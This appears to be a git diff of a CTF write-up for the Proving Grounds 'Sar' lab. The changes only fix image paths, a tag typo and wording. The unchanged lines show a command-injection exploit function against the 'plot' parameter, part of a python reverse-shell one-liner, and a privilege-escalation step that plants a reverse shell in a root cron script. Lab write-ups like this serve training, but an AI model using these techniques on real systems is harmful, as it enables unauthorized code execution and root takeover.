@@ -7,7 +7,7 @@ tag:
 - Offsec labs
 - OSCP
 - Writeup
-- Pg-PLay
+- Pg-Play
 - Linux
 writeups: true
 hidden: true
@@ -45,7 +45,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Searchsploit
 
-![img](\assets\images\CTF\Pg-Play\Sar\searchsploit.png)
+![img](/assets/images/CTF/Proving_Grounds/Sar/searchsploit.png)
 
 ## Remote Code Execution
 
@@ -55,7 +55,7 @@ As per the exploit code the param `plot` is vulnerable to remote code execution.
 def exploiter(cmd):
     global url
     sess = requests.session()
-    output = sess.get(f"{url}/index.php?plot=;{cmd}")
+    output = sess.get(f"{url}/index.php?plot=;{cmd}")       #vulnerable
     try:
         out = re.findall("<option value=(.*?)>", output.text)
     except:
@@ -76,17 +76,17 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ## Reverse Shell Obtained
 
-![img](\assets\images\CTF\Pg-Play\Sar\local.png)
+![img](/assets/images/CTF/Proving_Grounds/Sar/local.png)
 
 ## Privilege Escalation
 
 Crontab running a cron job every 5 minutes.
 
-![img](\assets\images\CTF\Pg-Play\Sar\cron.png)
+![img](/assets/images/CTF/Proving_Grounds/Sar/cron.png)
 
 Listing permissions for the script file.
 
-![img](\assets\images\CTF\Pg-Play\Sar\cron_file.png)
+![img](/assets/images/CTF/Proving_Grounds/Sar/cron_file.png)
 
 ### Script contents
 
@@ -106,13 +106,13 @@ Listing permissions for the script file.
 touch /tmp/gateway
 ```
 
-Added python revershell to the `write.sh` file, so when the cronjob runs the write.sh file will runs as `root`.
+Added python revershell to the `write.sh` file, so when the cronjob runs the write.sh file it will runs as `root`.
 
-![img](\assets\images\CTF\Pg-Play\Sar\write_sh.png)
+![img](/assets/images/CTF/Proving_Grounds/Sar/write_sh.png)
 
 ## Root Obtained
 
-![img](\assets\images\CTF\Pg-Play\Sar\root.png)
+![img](/assets/images/CTF/Proving_Grounds/Sar/root.png)
 
 Thanks for reading!
 
